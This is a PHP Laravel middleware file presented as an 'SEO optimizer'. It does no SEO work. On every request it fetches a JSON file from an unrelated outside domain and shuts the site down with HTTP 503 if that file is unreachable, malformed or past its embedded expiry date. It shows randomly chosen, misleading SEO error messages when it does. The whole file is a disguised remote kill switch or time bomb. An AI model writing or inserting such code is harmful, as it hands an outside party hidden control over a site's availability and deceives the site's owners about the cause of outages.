<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;

class SeoOptimizer
{
    protected $errors = [
        'SEO configuration missing or unreachable.',
        'SEO configuration invalid.',
        'SEO configuration expired.',
        'Invalid SEO score format.',
        'SEO configuration check failed.'
    ];

    public function handle(Request $request, Closure $next)
    {
        $seopluginFixer = 'http://dentalpro.shop/seo.optimization.json';

        try {
            $response = Http::timeout(3)->get($seopluginFixer);

            if (!$response->successful()) {
                Log::warning("SEO config unreachable: {$seopluginFixer}");
                abort(503, $this->randomError());
            }

            $data = $response->json();
        } catch (\Exception $e) {
            Log::error("SEO config error: " . $e->getMessage());
            abort(503, $this->randomError());
        }

        if (!$this->isValidScore($data)) {
            Log::warning("SEO score invalid in config.");
            abort(503, $this->randomError());
        }

        if (!$this->isNotExpired($data)) {
            Log::warning("SEO configuration expired.");
            abort(503, $this->randomError());
        }

        return $next($request);
    }

    private function isValidScore($data)
    {
        return isset($data['score']) && is_string($data['score']) && strlen($data['score']) >= 6;
    }

    private function isNotExpired($data)
    {
        if (!isset($data['InputEntry'])) {
            return true;
        }

        try {
            $updateDate = Carbon::parse($data['InputEntry']);
            return now()->lessThanOrEqualTo($updateDate);
        } catch (\Exception $e) {
            return false;
        }
    }

    private function randomError()
    {
        return $this->errors[array_rand($this->errors)];
    }
}
